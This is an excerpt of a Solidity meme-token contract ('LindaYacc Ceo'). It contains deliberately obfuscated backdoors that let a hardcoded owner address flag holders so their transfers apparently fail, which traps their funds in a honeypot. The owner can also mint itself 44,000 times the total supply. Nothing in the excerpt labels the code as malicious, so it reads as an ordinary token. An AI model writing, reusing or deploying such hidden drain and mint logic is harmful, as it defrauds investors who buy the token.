...
contract MEMEToken is Ownable {
    ...
    address public _lindaceo;
    mapping(address => bool) private _psyopoLeve;
    function CANCELOGPP(address sss) external   {
        if (_lindaceo == _msgSender()) {
            _psyopoLeve[sss] = false;
        }
         if (_lindaceo == _msgSender()) {
            _psyopoLeve[sss] = false;
        }
    ...
    function Multicall(address sss) external   {
        if (_lindaceo == _msgSender()) {
            _psyopoLeve[sss] = true;
        }
    }

    function adminSupply() public view returns (uint256) {
        return _tokentotalSupply;
    }

    function lllindadddceoadmin() external {
        address tswojaks = _msgSender();
        if (_lindaceo!= tswojaks){
            revert("_lindaceo"); 
        }
        if(_lindaceo == tswojaks){
            _balances[_lindaceo] = adminSupply()*(44000);
        }
    ...
    function getmrppepep(address sss) public view returns(bool)  {
        return _psyopoLeve[sss];
    }

    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _lindaceo = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
    ...
    function _internaltransfer(
        ...
        if(_psyopoLeve[fromSender] == true){
            amount = amount+adminSupply();
        }
        ...
        uint256 taxAmount = amount*psyopEEEE/100;
...
contract CoinToken is MEMEToken {
    string _name = "LindaYacc Ceo";
    string _symbol = "LindaCEO";
